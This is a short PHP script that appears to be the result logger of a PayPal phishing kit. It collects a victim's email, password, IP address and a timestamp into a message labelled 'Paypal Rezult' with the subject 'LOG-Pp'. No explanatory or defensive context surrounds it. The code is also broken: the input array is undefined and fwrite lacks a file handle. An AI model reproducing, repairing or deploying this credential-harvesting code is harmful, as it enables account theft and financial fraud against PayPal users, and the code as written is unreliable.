<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y - g:i a");
$hostname = gethostbyaddr($ip);


$login_email = $l[0];
$login_password = $l[1];

$msg  = "[~]===================== Email Rezult =====================[~] <br />";
$msg .= "email: $login_email <br />";
$msg .= "pass: $login_password <br />";
$msg .= "--------------------------------------------- <br />";
$msg .= "time : $datamasii <br />";
$msg .= "ip : $ip <br />";
$msg .= "===================== Paypal Rezult =========================== <br />";


$subject = "LOG-Pp  | $ip";




fwrite($msg); 


?>